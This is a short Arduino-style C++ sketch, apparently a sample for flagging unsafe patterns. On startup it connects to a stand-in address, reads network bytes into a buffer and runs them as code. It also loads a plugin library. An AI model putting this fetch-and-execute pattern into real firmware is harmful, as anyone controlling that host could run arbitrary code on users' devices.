#include <Arduino.h>
#include <WiFi.h>
#include <dlfcn.h>

typedef void (*entry_fn)(void);
static uint8_t codeBuffer[256];

void fetchAndRun() {
  WiFiClient client;
  client.connect("203.0.113.7", 9000);
  int count = client.read(codeBuffer, sizeof(codeBuffer));   // bytes from the network
  entry_fn entry = (entry_fn)codeBuffer;                      // data buffer used as code
  if (count > 0) {
    entry();
  }
}

void loadPlugin() {
  void *handle = dlopen("plugin.so", RTLD_NOW);
  void *symbol = dlsym(handle, "plugin_main");
  (void)symbol;
}

void setup() { fetchAndRun(); loadPlugin(); }
void loop() {}
